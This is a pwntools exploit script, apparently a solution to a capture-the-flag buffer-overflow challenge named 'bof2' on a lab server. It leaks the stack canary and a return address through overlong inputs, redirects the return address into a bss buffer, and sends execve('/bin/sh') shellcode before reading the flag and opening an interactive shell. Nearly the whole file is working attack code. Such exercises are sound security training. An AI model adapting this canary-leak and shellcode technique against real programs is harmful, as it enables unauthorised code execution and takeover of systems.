#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './challenges/bof2'
port = 10259

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)


######################################### nWhat's your name? 


r.recvuntil(b'name? ')
payloads = b'A' * 40

# pause()

r.send(payloads + b'B')
z = r.recvline()
print(">>> rec1: ", z)
canery = z.split(payloads)[1][1:8]
hex_canery = hex(u64(canery.ljust(8, b'\x00')))
# make 0xd15b28eda9583a to 0xd15b28eda9583a00
print(">>> canery", canery)
print(">>> hex_canery", hex_canery)

return_addr = z.split(payloads)[1][8:-1]
hex_return_addr = hex(u64(return_addr.ljust(8, b'\x00')))
print(">>> return_addr", return_addr)
print(">>> hex_return_addr", hex_return_addr)


######################################### nWhat's the room number?

# pause()

r.recvuntil(b'number? ')
payloads = b'A' * 40 + b'B' *16
r.send(payloads)
z = r.recvline()
print("\n\n>>> rec2: ", z)

return_addr = z.split(payloads)[1][0:-1]
hex_return_addr = hex(u64(return_addr.ljust(8, b'\x00')))
print(">>> return_addr", return_addr)
print(">>> hex_return_addr", hex_return_addr)

######################################### nWhat's the customer's name?
r.recvuntil(b'name? ')
payloads = b'A' * 40 + b'\x00'

msg = 0xd31e0       # 00000000000d31e0 <msg> in bss
main = 0x8b07       # 8b07 <main+0xa0> (0x8a67 + 0xa0)
msg_ptr = int(hex_return_addr, 16) - main + msg

print(">>> send: ", payloads + canery + p64(msg_ptr))

# pause()

r.send(payloads + canery + b'\x00' + canery + p64(msg_ptr))

z = r.recvline()
print("\n\n>>> rec3: ", z)
# print(r.recv())
# r.send("xxx")

codes = """
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp

mov rsi, 0
mov rdx, 0
mov rax, 59
syscall

mov rdi, 0
mov rax, 60
syscall
"""

payloads = asm(codes)
r.send(payloads)

# r.interactive()

r.send(b'cat /FLAG\n')
print(r.recv())

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :